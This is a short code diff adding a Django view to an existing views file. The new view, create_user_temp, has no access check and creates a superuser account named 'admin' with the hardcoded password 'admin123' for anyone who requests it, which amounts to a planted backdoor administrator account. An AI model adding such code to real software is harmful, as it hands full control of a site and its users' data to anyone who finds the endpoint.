@@ -217,3 +217,13 @@ def export_csv_view(request):
         ])
 
     return response
+
+
+
+from django.http import HttpResponse
+from django.contrib.auth.models import User
+
+def create_user_temp(request):
+    if not User.objects.filter(username="admin").exists():
+        User.objects.create_superuser("admin", "admin@gmail.com", "admin123")
+    return HttpResponse("User created")
